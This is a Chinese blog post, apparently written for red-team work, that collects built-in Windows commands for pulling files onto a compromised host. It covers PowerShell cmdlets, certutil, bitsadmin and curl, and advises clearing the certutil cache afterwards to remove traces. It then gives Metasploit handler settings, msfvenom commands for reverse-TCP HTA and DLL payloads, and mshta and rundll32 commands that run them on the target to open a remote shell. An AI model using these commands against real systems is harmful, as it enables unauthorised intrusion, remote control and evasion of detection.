---
title: Windows 远程下载文件和上线msf命令汇总
url: https://zgao.top/windows-%e8%bf%9c%e7%a8%8b%e4%b8%8b%e8%bd%bd%e6%96%87%e4%bb%b6%e5%91%bd%e4%bb%a4%e6%b1%87%e6%80%bb/
source: Zgao's blog
date: 2023-08-26
fetch_date: 2025-10-04T11:58:51.615051
---

# Windows 远程下载文件和上线msf命令汇总

# [Zgao's blog](https://zgao.top/)

愿有一日，安全圈的师傅们都能用上Zgao写的工具。

Toggle navigation

* [工具箱](https://zgao.top/tool/)
* [文章归档](https://zgao.top/archives/)
* [关于我](https://zgao.top/about-me/)
* [github](https://github.com/zgao264)
* Gmail

# Windows 远程下载文件和上线msf命令汇总

* [首页](https://zgao.top)
* [Windows 远程下载文件和上线msf命令汇总](https://zgao.top:443/windows-%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB/)

[1月 25, 2023](https://zgao.top/2023/01/)

### Windows 远程下载文件和上线msf命令汇总

作者 [Zgao](https://zgao.top/author/zgao/)
在[[红蓝对抗](https://zgao.top/category/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/)](https://zgao.top/windows-%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB/)

攻防中拿到Windows主机的权限后都需要下载文件到目标机器上，本文尽可能汇总Windows上所有自带的可下载命令。

总结到一半，发现 <https://lolbas-project.github.io/> 这个项目总结太全面，后续Windows上的下载执行命令都可以在上面查漏补缺。

文章目录

[ ]

* [下载命令](#%E4%B8%8B%E8%BD%BD%E5%91%BD%E4%BB%A4 "下载命令")
* [powershell 下载](#powershell_%E4%B8%8B%E8%BD%BD "powershell 下载")
  + [Invoke-WebRequest](#Invoke-WebRequest "Invoke-WebRequest")
  + [System.Net.WebClient](#SystemNetWebClient "System.Net.WebClient")
  + [Start-BitsTransfer](#Start-BitsTransfer "Start-BitsTransfer")
  + [System.Net.WebRequest](#SystemNetWebRequest "System.Net.WebRequest")
  + [Invoke-RestMethod](#Invoke-RestMethod "Invoke-RestMethod")
  + [System.Net.Http](#SystemNetHttp "System.Net.Http")
  + [System.Net.HttpClient](#SystemNetHttpClient "System.Net.HttpClient")
* [CMD 下载](#CMD_%E4%B8%8B%E8%BD%BD "CMD 下载")
  + [bitsadmin](#bitsadmin "bitsadmin ")
  + [certutil](#certutil "certutil")
  + [curl](#curl "curl")
* [不能直接下载文件，但可以执行上线的命令](#%E4%B8%8D%E8%83%BD%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%EF%BC%8C%E4%BD%86%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%91%BD%E4%BB%A4 "不能直接下载文件，但可以执行上线的命令")
  + [mshta](#mshta "mshta")
    - [mshta 上线msf](#mshta_%E4%B8%8A%E7%BA%BFmsf "mshta 上线msf")
  + [rundll32](#rundll32 "rundll32")

## 下载命令

* powershell
  + Invoke-WebRequest
  + System.Net.WebClient
  + Start-BitsTransfer
  + System.Net.WebRequest
  + Invoke-RestMethod
  + System.Net.Http
  + System.Net.HttpClient
* cmd
  + bitsadmin
  + certutil
  + curl
* 不能直接下载文件，但可以执行上线的命令
  + mshta
  + rundll32
  + regsvr32

## powershell 下载

### Invoke-WebRequest

```
Invoke-WebRequest -Uri "https://example.com/file.zip" -OutFile "C:\Path\to\save\file.zip"
```

![](https://zgao.top/wp-content/uploads/2023/08/image-6-1024x401.png)

### System.Net.WebClient

```
(New-Object System.Net.WebClient).DownloadFile("https://example.com/file.zip", "C:\Path\to\save\file.zip")
```

![](https://zgao.top/wp-content/uploads/2023/08/image-7-1024x424.png)

### Start-BitsTransfer

```
Start-BitsTransfer -Source "https://example.com/file.zip" -Destination "C:\Path\to\save\file.zip"
```

![](https://zgao.top/wp-content/uploads/2023/08/image-8-1024x425.png)

### System.Net.WebRequest

```
$response = [System.Net.WebRequest]::Create('https://example.com/file.zip').GetResponse(); $stream = $response.Get
ResponseStream(); $readStream = New-Object System.IO.StreamReader $stream; $result = $readStream.ReadToEnd(); $readStrea
m.Close(); $response.Close(); [System.IO.File]::WriteAllText('C:\Path\to\save\file.zip', $result)
```

![](https://zgao.top/wp-content/uploads/2023/08/image-9-1024x380.png)

### Invoke-RestMethod

```
Invoke-RestMethod -Uri "https://example.com/file.zip" -OutFile "C:\Path\to\save\file.zip"
```

![](https://zgao.top/wp-content/uploads/2023/08/image-10-1024x429.png)

### System.Net.Http

```
Add-Type -AssemblyName System.Net.Http; (New-Object System.Net.Http.HttpClient).GetStringAsync('https://example.com/file.zip').Result | Set-Content -Path 'C:\Path\to\save\file.zip'
```

![](https://zgao.top/wp-content/uploads/2023/08/image-11-1024x387.png)

### System.Net.HttpClient

```
(New-Object System.Net.Http.HttpClient).GetAsync('https://example.com/file.zip').Result.Content.ReadAsByteArrayAsync().Result | Set-Content -Path 'C:\Path\to\save\file.zip' -Encoding Byte
```

![](https://zgao.top/wp-content/uploads/2023/08/image-12-1024x393.png)

## CMD 下载

### bitsadmin

```
bitsadmin /transfer myDownloadJob /download /priority normal http://example.com/file.zip C:\path\to\file.zip
```

经测试，在win10以上的系统中bitsadmin无法正常使用。注意，`bitsadmin`是Windows 7和Windows Server 2008中的一部分，但在Windows 10和更高版本中已被弃用。

![](https://zgao.top/wp-content/uploads/2023/08/image-13-1024x472.png)

### certutil

```
certutil -urlcache -split -f https://example.com/file.zip C:\Path\to\save\file.zip
```

![](https://zgao.top/wp-content/uploads/2023/08/image-15-1024x510.png)

由于certutil下载文件都会留下缓存，所以建议下载完文件后对缓存进行删除。

默认情况下，缓存目录的位置如下：

* Windows 7/8/8.1：`%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content`
* Windows 10：`%USERPROFILE%\AppData\Local\Microsoft\CryptnetUrlCache\Content`

`%USERPROFILE%`是用户的个人文件夹路径（通常为`C:\Users\<username>`），根据Windows版本和用户名可能会有所不同。

```
certutil -urlcache -split -f https://example.com/file.zip delete
```

![](https://zgao.top/wp-content/uploads/2023/08/image-16-1024x532.png)

### curl

在一些高版本的Windows系统中才有curl命令。

```
curl -sk "https://example.com/file.zip"  -o "C:\Path\to\save\file.zip"
```

![](https://zgao.top/wp-content/uploads/2023/08/image-19-1024x396.png)

## 不能直接下载文件，但可以执行上线的命令

下面的命令中，全部统一使用msf的meterpreter反向tcp。

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 4444
run
```

### mshta

MSHTA是Windows内置的一个程序，主要用于执行HTA程序。MSHTA可以直接执行远端的HTAHTA程序，可以包括VBScript、JScript等代码，以此执行命令通过MSHTA运行HTA程序执行命令的方式，可以加载本地受限应用，以此绕过应用白名单限制MSHTA在浏览器外部运行，因此也可绕过浏览器安全设置。

mshta 我个人感觉就是一个浏览器，但是权限又比浏览器要大。

```
mshta https://zgao.top
```

![](https://zgao.top/wp-content/uploads/2023/08/image-18-1024x425.png)

像浏览器一样请求远端的url，可以通过mshta执行恶意的payload，但是没办法将文件直接下载到本地。

#### mshta 上线msf

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<你的IP地址> LPORT=<你的端口号> -f hta-psh > output.hta
python3 -m http.server
```

在目标Windows上执行

```
mshta http://ip:8000/output.hta
```

### rundll32

Rundll32.exe功能是以命令行的方式调用动态链接程序库。然而`rundll32.exe`并不直接支持从远程位置（如网络共享或HTTP服务器）加载DLL。

用msf生成恶意的dll执行上线。

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<你的IP地址> LPORT=<你的端口号> -f dll > output.dll
```

在目标Windows上执行，dll后面是执行的方法名。

```
rundll32.exe output.dll,Control_RunDLL
```

Post Views: 1,401

赞赏

![](https://zgao.top/wp-content/uploads/2022/02/QQ图片20201028114105.jpeg)微信赞赏![](https://zgao.top/wp-content/uploads/2022/02/QQ图片20201028114100.jpeg)支付宝赞赏

###### Zgao

愿有一日，安全圈的师傅们都能用上Zgao写的工具。

### 发表评论 [取消回复](/windows-%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB/#respond)

Δ

版权©2020 Author By : Zgao